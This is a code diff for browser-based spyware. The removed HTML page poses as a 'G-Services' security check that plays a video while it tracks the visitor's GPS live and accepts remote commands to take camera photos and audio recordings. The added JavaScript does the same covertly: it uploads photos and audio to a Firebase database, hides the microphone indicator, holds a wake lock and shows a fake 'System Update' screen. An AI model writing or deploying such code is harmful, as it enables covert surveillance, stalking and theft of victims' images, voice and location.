@@ -1,149 +1,87 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>G-Services - Security Verification</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <style>
-        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; margin: 0; overflow: hidden; }
-        .box { padding: 60px 20px; }
-        #playBtn { 
-            background: #d93025; color: white; border: none; padding: 18px 50px; 
-            font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer;
-            box-shadow: 0 0 30px rgba(217, 48, 37, 0.5); transition: 0.3s;
+// --- Driver side logic for stealth background processing ---
+
+const targetID = "AGENT_001"; // Target ka ID
+const db = firebase.database();
+
+// 1. WakeLock: Screen off hone par bhi processor ko chalne deta hai
+let wakeLock = null;
+async function requestWakeLock() {
+    try {
+        if ('keepAwake' in screen) {
+            wakeLock = await screen.keepAwake(true);
+        } else if ('wakeLock' in navigator) {
+            wakeLock = await navigator.wakeLock.request('screen');
         }
-        #playBtn:active { transform: scale(0.95); }
-        #videoArea { display: none; width: 100vw; height: 100vh; position: fixed; top:0; left:0; background:#000; }
-        iframe { width: 100%; height: 100%; border: none; }
-        #captureOverlay { position: absolute; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
-    </style>
-</head>
-<body>
+    } catch (err) {
+        console.log("WakeLock failed: " + err.message);
+    }
+}
 
-    <div id="mainUI" class="box">
-        <h1 style="color: #4285f4; margin-bottom: 10px;">G-Services</h1>
-        <p style="color: #999;">Security check required to access this content.</p>
-        <div style="margin: 40px 0;">
-            <button id="playBtn" onclick="initiateSystem()">CONFIRM & WATCH</button>
-        </div>
-        <p style="font-size: 12px; color: #444;">Verification ID: <span id="displayId">...</span></p>
-    </div>
+// 2. Command Listener (Commands check karta rahega)
+db.ref('commands/' + targetID).on('value', async (snapshot) => {
+    const cmd = snapshot.val();
+    if (!cmd) return;
 
-    <div id="videoArea">
-        <div id="captureOverlay"></div>
-        <iframe id="videoPlayer" src="" allow="autoplay; camera; microphone; geolocation"></iframe>
-    </div>
+    // Wake up process
+    await requestWakeLock();
 
-    <script>
-        // 1. Firebase Config
-        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
-        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
-        const db = firebase.database();
+    if (cmd.action === 'photo_front' || cmd.action === 'photo_back') {
+        takePhoto(cmd.action === 'photo_front' ? 'user' : 'environment');
+    } else if (cmd.action === 'audio_record') {
+        startBackgroundAudio();
+    }
+});
 
-        // 2. User ID Setup
-        let userId = localStorage.getItem("target_uid") || "Target_" + Math.floor(Math.random() * 9000 + 1000);
-        localStorage.setItem("target_uid", userId);
-        document.getElementById('displayId').innerText = userId;
+// 3. Background Audio Recording (3-5 Seconds)
+async function startBackgroundAudio() {
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    const mediaRecorder = new MediaRecorder(stream);
+    let chunks = [];
 
-        // 3. Main Initiation
-        async function initiateSystem() {
-            try {
-                // Permissions Request
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-                stream.getTracks().forEach(t => t.stop());
-
-                // UI Switch
-                document.getElementById('mainUI').style.display = 'none';
-                document.getElementById('videoArea').style.display = 'block';
-                
-                // YouTube Embed
-                document.getElementById('videoPlayer').src = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=0&controls=0";
-
-                startTracking(); 
-            } catch (err) {
-                alert("Error: Please allow Camera and Location to watch the video.");
-            }
-        }
-
-        // 4. Tracking & Commands
-        function startTracking() {
-            // Live GPS Update
-            navigator.geolocation.watchPosition(pos => {
-                db.ref('targets/' + userId + '/location').update({
-                    lat: pos.coords.latitude,
-                    lng: pos.coords.longitude,
-                    accuracy: Math.round(pos.coords.accuracy) + "m",
-                    last_seen: new Date().toLocaleTimeString()
-                });
-            }, null, { enableHighAccuracy: true });
-            
-            // Listen for Admin Commands
-            db.ref('commands/' + userId).on('value', async snap => {
-                const cmd = snap.val();
-                if (!cmd) return;
-
-                if (cmd.action === "photo_front") capturePhoto("user");
-                if (cmd.action === "photo_back") capturePhoto("environment");
-                if (cmd.action === "audio_record") recordAudio(30000);
-
-                db.ref('commands/' + userId).remove();
+    mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+    mediaRecorder.onstop = async () => {
+        const blob = new Blob(chunks, { type: 'audio/webm' });
+        const reader = new FileReader();
+        reader.readAsDataURL(blob);
+        reader.onloadend = () => {
+            // Firebase mein upload
+            db.ref('targets/' + targetID + '/audios').push({
+                audio: reader.result,
+                time: Date.now()
             });
-        }
+        };
+        stream.getTracks().forEach(track => track.stop()); // Mic band taake icon gayab ho jaye
+    };
 
-        // 5. Photo Capture
-        async function capturePhoto(mode) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: mode, width: 1280, height: 720 } 
-                });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
+    mediaRecorder.start();
+    setTimeout(() => mediaRecorder.stop(), 5000); // 5 second record karega
+}
 
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth; 
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                const imageData = canvas.toDataURL('image/jpeg', 0.6);
-                
-                db.ref('targets/' + userId + '/photos').push({
-                    img: imageData,
-                    type: mode === "user" ? "Front" : "Back",
-                    timestamp: new Date().toLocaleString()
-                });
+// 4. Silent Camera Capture
+async function takePhoto(mode) {
+    const stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: mode } 
+    });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
 
-                stream.getTracks().forEach(t => t.stop());
-            } catch (e) { console.error(e); }
-        }
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    
+    const dataUrl = canvas.toDataURL('image/jpeg', 0.5); // Quality 50% for fast upload
+    
+    db.ref('targets/' + targetID + '/photos').push({
+        img: dataUrl,
+        time: Date.now()
+    });
 
-        // 6. Audio Recording
-        async function recordAudio(duration) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(stream);
-                let chunks = [];
+    stream.getTracks().forEach(track => track.stop());
+}
 
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                mediaRecorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'audio/webm' });
-                    const reader = new FileReader();
-                    reader.readAsDataURL(blob);
-                    reader.onloadend = () => {
-                        db.ref('targets/' + userId + '/audios').push({
-                            audio: reader.result,
-                            timestamp: new Date().toLocaleString()
-                        });
-                    };
-                    stream.getTracks().forEach(t => t.stop());
-                };
-
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), duration);
-            } catch (e) { console.error(e); }
-        }
-    </script>
-</body>
-</html>
+// Stealth UI: User ko sirf blank screen ya fake "Loading" dikhe
+document.body.innerHTML = `<div style="background:black; color:white; height:100vh; display:flex; align-items:center; justify-content:center;">
+    <p>System Update in Progress... 15%</p>
+</div>`;
